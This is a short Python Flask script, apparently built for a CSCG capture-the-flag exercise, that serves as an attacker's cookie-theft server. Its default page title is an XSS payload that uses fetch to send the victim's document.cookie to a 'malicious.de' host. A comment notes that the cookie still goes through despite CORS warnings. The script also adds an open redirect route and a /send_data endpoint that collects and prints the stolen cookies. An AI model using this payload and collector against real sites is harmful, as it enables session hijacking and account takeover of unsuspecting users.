from flask import Flask, render_template, request, redirect
from http.cookies import SimpleCookie

app = Flask(__name__)

@app.route("/")
def base():
    if(request.args.get('page_title')):
        page_title = request.args['page_title']
    else:
        # page_title = "alt onload=alert(1234)"
        # TODO: browser beschwert sich noch über CORS violation aber der Cookie wird trotzdem gesendet
        page_title = "alt onload=fetch('http://cscg.de.malicious.de/send_data',{method:'POST',body:document.cookie});"
    return render_template('simple_template.html', page_title=page_title)

@app.route("/redirect")
def redirect_to_arbitrary():
    if request.args.get("redirect_to"):
        redirect_to = request.args["redirect_to"]
    else:
        redirect_to = "http://www.google.com"
    return redirect(redirect_to, code=302)

@app.route("/send_data", methods = ['POST'])
def get_image():
    data = request.data.decode("utf-8")
    cookie = SimpleCookie()
    cookie.load(data)
    cookie_dict = {key: value.value for key, value in cookie.items()}
    print(f"[*] Received some juicy cookie:")
    for key, value in cookie_dict.items():
        print(f"\t{key}: {value}")
    return "{}", 201

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
